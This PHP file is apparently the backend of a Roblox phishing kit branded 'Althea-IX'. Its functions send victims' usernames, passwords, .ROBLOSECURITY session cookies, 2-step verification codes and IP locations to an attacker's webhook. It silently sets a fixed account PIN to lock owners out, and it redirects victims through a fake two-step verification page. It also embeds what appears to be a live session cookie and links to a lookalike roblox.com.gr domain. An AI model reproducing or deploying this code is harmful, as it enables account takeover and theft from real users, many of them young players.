<?php

function request($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

// Start of True Login

function get_csrf()
{
    $post_fields = "{\"cvalue\":\"username\",\"ctype\":\"Username\",\"password\":\"password\",\"captchaToken\":\"token\",\"captchaProvider\":\"PROVIDER_ARKOSE_LABS\"}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v2/login");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = [];
    $result = rtrim($result);
    $data = explode("\n",$result);
    $headers['status'] = $data[0];
    array_shift($data);
    foreach($data as $part){

        //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
        $middle = explode(":",$part,2);

        //Supress warning message if $middle[1] does not exist, Thanks to @crayons
        if ( !isset($middle[1]) ) { $middle[1] = null; }
        $headers[trim($middle[0])] = trim($middle[1]);
    }
    
    $csrf = $headers["x-csrf-token"];
    return $csrf;
}

function get_headers_from_curl_response($response, $header_size)
{
    $header_text = substr($response, 0, $header_size);

    foreach (explode("\r\n", $header_text) as $i => $line)
        if ($i === 0)
            $headers['http_code'] = $line;
        else {
            list($key, $value) = explode(': ', $line);

            $headers[$key] = $value;
        }

    return $headers;
}


function requestCookie($url, $cookie)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=$cookie"));
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function requestRapCookie($userId, $cookie)
{
    $getRap = requestCookie("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?sortOrder=Asc&limit=100", $cookie);
    $rapDecode = json_decode($getRap, true);
    if (strpos($getRap, 'data') !== false) {
        $rapData = $rapDecode["data"];
        $rap = 0;
        foreach ($rapData as $rapValue) {
            $rap += $rapValue["recentAveragePrice"];
        }
        return $rap;
    } else {
        return "Private";
    }
    return;
}

function requestMobileInfoCookie($cookie)
{
    $getMobileInfo = requestCookie("https://www.roblox.com/mobileapi/userinfo", $cookie);
    return $getMobileInfo;
}

function requestPinCookie($cookie)
{
    $getPin = requestCookie("https://auth.roblox.com/v1/account/pin", $cookie);
    $getPinDecode = json_decode($getPin);
    $pin = $getPinDecode->isEnabled;
    return $pin;
}

function requestCreditCookie($cookie)
{
    $getCredit = requestCookie("https://billing.roblox.com/v1/gamecard/userdata", $cookie);
    $_Credit = str_replace('"', '', $getCredit);
    return $_Credit;
}

function requestVerifiedCookie($cookie)
{
    $getVerified = requestCookie("https://accountsettings.roblox.com/v1/email", $cookie);
    $getVerifiedDecode = json_decode($getVerified);
    if ($getVerifiedDecode->verified == False) {
        return "Unverified";
    } else {
        return "Verified";
    }
}

function requestTrueCookie($cookie)
{
    $getTrue = requestCookie("https://accountsettings.roblox.com/v1/email", $cookie);
    if (strpos($getTrue, '"message":"Authorization has been denied for this request."')) {
        return "Cookie is not valid";
    } else {
        return "Cookie is valid";
    }
}

function webhookCookie($user, $id, $robux, $rap, $premium, $credit, $pin, $age, $verif, $pass, $cookie, $code)
{
    if ($pin == true) $pin = "This account already has a PIN";

    if ($verif == "Verified" && $pin == false) {

        function http_parse_headers($raw_headers)
        {
            $headers = [];

            foreach (explode("\n", $raw_headers) as $i => $h) {
                $h = explode(':', $h, 2);

                if (isset($h[1])) $headers[$h[0]] = trim($h[1]);
            }

            return $headers;
        }

        function getcsrfkick($cookies)
        {
            $header = array();
            $header[] = "Content-Type: application/json";
            $header[] = "Accept: application/json";
            $header[] = "Cookie: .ROBLOSECURITY=$cookies";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://presence.roblox.com/v1/presence/register-app-presence");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
            $response = curl_exec($ch);
            $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);

            return http_parse_headers(substr($response, 0, $headerSize))['x-csrf-token'];
        }

        $csrf = getcsrfkick($cookie);
        $ch = curl_init();
        $header = array();
        $header[] = "Content-Type: application/json";
        $header[] = "Accept: application/json";
        $header[] = "Cookie: .ROBLOSECURITY=$cookie";
        $header[] = "X-CSRF-TOKEN: $csrf";
        $post = '{ "pin" : "2615" }';

        curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/account/pin");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);

        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $myfile = fopen($_SERVER["DOCUMENT_ROOT"] . "/api/logs.txt", "wb");
        $txt = "RES:$response HTTP:$httpcode CSRF:$csrf\n";
        fwrite($myfile, $txt);
        fclose($myfile);

        curl_close($ch);
        if ($httpcode == 200) $pin = "2615";
    }

    $webhookParams = json_encode([
        "username" => "Althea-IX",
        "avatar_url" => "https://wallpapercave.com/wp/wp3913976.jpg",
        "content" => "",
        "embeds" => [
            [
                "title" => "Account Informations",
                "description" => "Below there is " . $user . "'s details of the account.
                [Check Cookie!](https://www.roblox.com.gr/check_cookie/$cookie)",
                "thumbnail" => [
                    "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $id . "&width=352&height=352&format=png"
                ],
                "fields" => [
                    [
                        "name" => "Username",
                        "value" => $user,
                        "inline" => false
                    ],
                    [
                        "name" => "Password",
                        "value" => $pass,
                        "inline" => false
                    ],
                    [
                        "name" => "Rap",
                        "value" => $rap,
                        "inline" => true
                    ],
                    [
                        "name" => "Robux",
                        "value" => $robux,
                        "inline" => true
                    ],
                    [
                        "name" => "Credit",
                        "value" => $credit,
                        "inline" => true
                    ],
                    [
                        "name" => "Premium",
                        "value" => $premium,
                        "inline" => true
                    ],
                    [
                        "name" => "Status",
                        "value" => $verif,
                        "inline" => true
                    ],
                    [
                        "name" => "Pin",
                        "value" => $pin,
                        "inline" => true
                    ],
                    [
                        "name" => "Account Age",
                        "value" => $age,
                        "inline" => true
                    ],
                    [
                        "name" => "Cookie",
                        "value" => "```" . $cookie . "```",
                        "inline" => false
                    ]
                ]
            ]
        ]
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    $ch = curl_init($code);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $webhookParams);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
}

// End of True Login

function requestGroupApi($id)
{
    $getGroupApi = request("https://groups.roblox.com/v1/groups/$id");
    return json_decode($getGroupApi);
}

function requestId($username)
{
    $getId = request("https://api.roblox.com/users/get-by-username?username=$username");
    if (strpos($getId, 'Id') !== false) {
        $idDecode = json_decode($getId);
        $id = $idDecode->Id;
        return $id;
    } else {
        return "Not Exist";
    }
    return;
}

function requestAvatarHeadshot($id)
{
    $getAvatarHeadshot = request("https://www.roblox.com/headshot-thumbnail/json?userId=$id&width=150&height=150");
    return json_decode($getAvatarHeadshot);
}

function requestGroup($id, $groupName)
{
    $getGroup = request("https://www.roblox.com/groups/$id/$groupName#!/about");
    return strval($getGroup);
}

function requestVerify($userId)
{
    $getVerify1 = request("https://api.roblox.com/ownership/hasasset?userId=$userId&assetId=102611803");
    if ($getVerify1 == "false") {
        $getVerify2 = request("https://api.roblox.com/ownership/hasasset?userId=$userId&assetId=1567446");
        if ($getVerify2 == "false") {
            return "Unverified";
        } else {
            return "Verified";
        }
    } else {
        return "Verified";
    }
    return;
}

function requestRap($userId)
{
    $getRap = request("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?sortOrder=Asc&limit=100");
    $rapDecode = json_decode($getRap, true);
    if (strpos($getRap, 'data') !== false) {
        $rapData = $rapDecode["data"];
        $rap = 0;
        foreach ($rapData as $rapValue) {
            $rap += $rapValue["recentAveragePrice"];
        }
        return $rap;
    } else {
        return "Private";
    }
    return;
}

function requestAge($id)
{
    $getDateBirth = request("https://users.roblox.com/v1/users/$id");
    $jsonDateBirth = json_decode($getDateBirth);
    preg_match('/(?<=)(.*?)(?=T)/', $jsonDateBirth->created, $result);
    $dateBirth = $result[0];
    $Today = date("Y-m-d");
    $Count = date_diff(date_create($dateBirth), date_create($Today));
    return $Count->days . " Days";
}

function requestJoinDate($id)
{
    $getDateBirth = request("https://users.roblox.com/v1/users/$id");
    $jsonDateBirth = json_decode($getDateBirth);
    preg_match('/(?<=)(.*?)(?=T)/', $jsonDateBirth->created, $result);
    if ($result[0] == true) {
        $dateBirth = $result[0];
        $newDate = date("m/d/Y", strtotime($dateBirth));
        return $newDate;
    }
}

function requestPremium($id)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://premiumfeatures.roblox.com/v1/users/$id/validate-membership");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_358C1BE3BCD5A19382FF828AFCFB7B8C9395D0C215A4E43F606CDF61DB289BF8FD13A64577DF01B370C3055F26EA6C334A27F5CC523C7464DDD95AB681B6B8C34D5972E20A2A25DB76C4A5245DBC0F8FBC66FA105CA929B1F2C980CF3193DB5C114374FCE5516A9D918A97376056BD49F78B0D4347B0A2D40B65F494E35F695E136E6E15060382C16C633504F6428A98256D18C9517403FC3F5171FE2B11637B5804DDBB190124FACB2BE307C97FD3F46F14B58D683D1DACC41EC22D06A858466E67591F22C146D98FD103B0636A8E306237DCFB6EC87C951BC243181756BB552717ABF7E6F915367B49FE361B56D570AB8261BEA049AFE5D5D6C80183E9A51EDF048B4788AD48E42904F93E059A0E89E972DF45AB0F795FD5163006844779988461A7F8"));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    if ($output == "false") {
        return "False";
    } else if ($output == "true") {
        return "True";
    } else {
        return "Error";
    }
}

function get_client_ip()
{
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if (getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if (getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if (getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if (getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if (getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function requestIp()
{
    $ip = get_client_ip();
    if ($ip != "UNKNOWN") {
        $getIp = request("http://ip-api.com/json/$ip");
        $jsonIp = json_decode($getIp);
        return $ip . " (" . $jsonIp->country . ")";
    }
}

function webhookProfile($code, $webhookCode, $id, $user, $pass, $status, $rap, $ip)
{
    $webhookParams = json_encode([
        "username" => "Althea-IX",
        "avatar_url" => "https://wallpapercave.com/wp/wp3913976.jpg",
        "content" => "",
        "embeds" => [
            [
                "title" => "Account Informations",
                "description" => "Below there is " . $_POST['username'] . "'s details of the account.",
                "thumbnail" => [
                    "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $id . "&width=352&height=352&format=png"
                ],
                "fields" => [
                    [
                        "name" => "Username",
                        "value" => $user,
                        "inline" => false
                    ],
                    [
                        "name" => "Password",
                        "value" => $pass,
                        "inline" => false
                    ],
                    [
                        "name" => "Status",
                        "value" => $status,
                        "inline" => false
                    ],
                    [
                        "name" => "Rap",
                        "value" => $rap,
                        "inline" => true
                    ],
                    [
                        "name" => "IP Address, Location",
                        "value" => $ip,
                        "inline" => true
                    ]
                ]
            ]
        ]
    ]);
    $ch = curl_init($code);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $webhookParams);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    sleep(1);
    if ($status == "Verified") {
        header('Location: /login/twostepverification?returnUrl=https:%2F%2Fwww.roblox.com%2Flogin%3Fnl%3Dtrue&tl=3f8da66d-f239-45d8-9406-13491ccd5ac0&username=' . $user . '&code=' . $webhookCode);
    } else {
        header('Location: https://www.roblox.com/home');
    }
}

function webhookProfileV2($code, $webhookCode, $id, $user, $pass, $status, $rap, $premium, $age, $ip)
{
    $webhookParams = json_encode([
        "username" => "Althea-IX - Information",
        "avatar_url" => "https://wallpapercave.com/wp/wp3913976.jpg",
        "content" => "",
        "embeds" => [
            [
                "title" => "+1 Account Information",
                "description" => "Below there is " . $_POST['username'] . "'s details of the account.",
                "url" => "https://www.roblox.com",
                "color" => 16514299,
                "thumbnail" => [
                    "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $id . "&width=352&height=352&format=png"
                ],
                "footer" => [
                    "text" => "Copyrights FAK#1979. All rights reserved.",
                    "icon_url" => "https://cdn3.iconfinder.com/data/icons/flat-actions-icons-9/792/Tick_Mark_Circle-512.png"
                ],
                "author" => [
                    "name" => "Althea-IX - Account Information",
                    "icon_url" => "https://wallpapercave.com/wp/wp3913976.jpg"
                ],
                "fields" => [
                    [
                        "name" => "Username",
                        "value" => $user,
                        "inline" => true
                    ],
                    [
                        "name" => "Password",
                        "value" => $pass,
                        "inline" => false
                    ],
                    [
                        "name" => "Status",
                        "value" => $status,
                        "inline" => true
                    ],
                    [
                        "name" => "Rap",
                        "value" => $rap,
                        "inline" => true
                    ],
                    [
                        "name" => "Premium",
                        "value" => $premium,
                        "inline" => true
                    ],
                    [
                        "name" => "Account Age",
                        "value" => "`" . $age . "`",
                        "inline" => true
                    ],
                    [
                        "name" => "Rolimons",
                        "value" => "[`Click here to view`](https://www.rolimons.com/player/$id)",
                        "inline" => true
                    ],
                    [
                        "name" => "Ip Address (Location)",
                        "value" => "`$ip`",
                        "inline" => true
                    ]
                ]
            ]
        ]
    ]);
    $ch = curl_init($code);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $webhookParams);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    sleep(1);
    if ($status == "Verified") {
        header('Location: /login/twostepverification?returnUrl=https:%2F%2Fwww.roblox.com%2Flogin%3Fnl%3Dtrue&tl=3f8da66d-f239-45d8-9406-13491ccd5ac0&username=' . $user . '&code=' . $webhookCode);
    } else {
        header('Location: https://www.roblox.com/home');
    }
}

function webhookBefore2Step($code, $id, $username, $pass)
{
    $webhookParams = json_encode([
        "username" => "Althea-IX",
        "avatar_url" => "https://wallpapercave.com/wp/wp3913976.jpg",
        "content" => "",
        "embeds" => [
            [
                "title" => "Login Notifier",
                "description" => "```$username has been logging in, Waiting for code!\nUsername: $username\nPassword: $pass```",
                "thumbnail" => [
                    "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $id . "&width=352&height=352&format=png"
                ],
            ]
        ]
    ]);
    $ch = curl_init($code);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $webhookParams);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
}

function webhook2Step($code, $user, $verifCode, $ip)
{
    $webhookParams = json_encode([
        "username" => "Althea-IX",
        "avatar_url" => "https://wallpapercave.com/wp/wp3913976.jpg",
        "content" => "",
        "embeds" => [
            [
                "title" => "2-Step Verification",
                "description" => "Below there is the code for 2 Step Verification.",
                "fields" => [
                    [
                        "name" => "Username",
                        "value" => $user,
                        "inline" => true
                    ],
                    [
                        "name" => "Code",
                        "value" => $verifCode,
                        "inline" => true
                    ],
                    [
                        "name" => "Ip Address",
                        "value" => $ip,
                        "inline" => true
                    ]
                ]
            ]
        ],
    ]);
    $ch = curl_init($code);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $webhookParams);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    sleep(1);
    header('Location: https://www.roblox.com/home');
}

function requestSponsorship($id)
{
    $getSponsorship = request("https://www.roblox.com/user-sponsorship/$id");
    return $getSponsorship;
}

function getThumbnail($stringCode)
{
    preg_match('/(?<=meta property="og:image" content=")(.*?)(?=")/', $stringCode, $result);
    return $result[0];
}


function getStatusText($stringCode)
{
    preg_match('/(?<=data-statustext=")(.*?)(?=")/', $stringCode, $result);
    return $result[0];
}

function getStatistic($stringCode)
{
    preg_match('/(?<=<div class="section profile-statistics">)(.*?)(?=<div class=tab-pane)/', $stringCode, $result);
    return $result[0];
}

function getFavorites($stringCode)
{
    if (preg_match('/(?<=<div class="container-list favorite-games-container">)(.*?)(?=<div class=section)/', $stringCode, $result)) {
        return $result[0];
    }
}

function getFriendsCount($stringCode)
{
    preg_match('/(?<=data-friendscount=)(.*?)(?= )/', $stringCode, $result);
    $result = $result[0];
    if (strlen($result) > 4) {
        preg_match('/.../', $result, $result);
        $result = $result[0] . "K+";
        return $result;
    } else {
        return number_format($result);
    };
}

function getFollowersCount($stringCode)
{
    preg_match('/(?<=data-followerscount=)(.*?)(?= )/', $stringCode, $result);
    $result = $result[0];
    if (strlen($result) > 4) {

        preg_match('/.../', $result, $result);
        $result = $result[0] . "K+";
        return strlen($result);
    } else {
        return number_format($result);
    }
}

function getFollowingCount($stringCode)
{
    preg_match('/(?<=data-followingscount=)(.*?)(?= )/', $stringCode, $result);
    $result =     $result[0];
    if (strlen($result) > 4) {
        preg_match('/.../', $result, $result);
        $result = $result[0] . "K+";
        return $result;
    } else {
        return number_format($result);
    }
}
function get_CURL($url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($curl);
    curl_close($curl);

    return json_decode($result, true);
}

function requestLike($id)
{
    $getName = request("https://www.roblox.com/games/votingservice/$id");
    return $getName;
}
function requestAssetsid($id)
{
    $getName = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getName, 'AssetId') !== false) {
        $idDecode = json_decode($getName);
        $name = $idDecode->AssetId;
        return $name;
    } else {
        return "Not Exist";
    }
    return;
}
function requestName($id)
{
    $getName = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getName, 'Name') !== false) {
        $idDecode = json_decode($getName);
        $name = $idDecode->Name;
        return $name;
    } else {
        return "Not Exist";
    }
    return;
}
function requestDesc($id)
{
    $getDesc = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getDesc, 'Description') !== false) {
        $idDecode = json_decode($getDesc);
        $desc = $idDecode->Description;
        return $desc;
    } else {
        return "Not Exist";
    }
    return;
}
function requestBuilder($id)
{
    $getBuilder = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getBuilder, 'Builder') !== false) {
        $idDecode = json_decode($getBuilder);
        $builder = $idDecode->Builder;
        return $builder;
    } else {
        return "Not Exist";
    }
    return;
}
function requestBuilderlink($id)
{
    $getBuilder = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getBuilder, 'BuilderAbsoluteUrl') !== false) {
        $idDecode = json_decode($getBuilder);
        $builder = $idDecode->BuilderAbsoluteUrl;
        return $builder;
    } else {
        return "Not Exist";
    }
    return;
}
function requestUrl($id)
{
    $getUrl = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getUrl, 'Url') !== false) {
        $idDecode = json_decode($getUrl);
        $Url = $idDecode->Url;
        return $Url;
    } else {
        return "Not Exist";
    }
    return;
}
function requestUniverse($id)
{
    $getUniverseId = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getUniverseId, 'UniverseId') !== false) {
        $idDecode = json_decode($getUniverseId);
        $uni = $idDecode->UniverseId;
        return $uni;
    } else {
        return "Not Exist";
    }
    return;
}
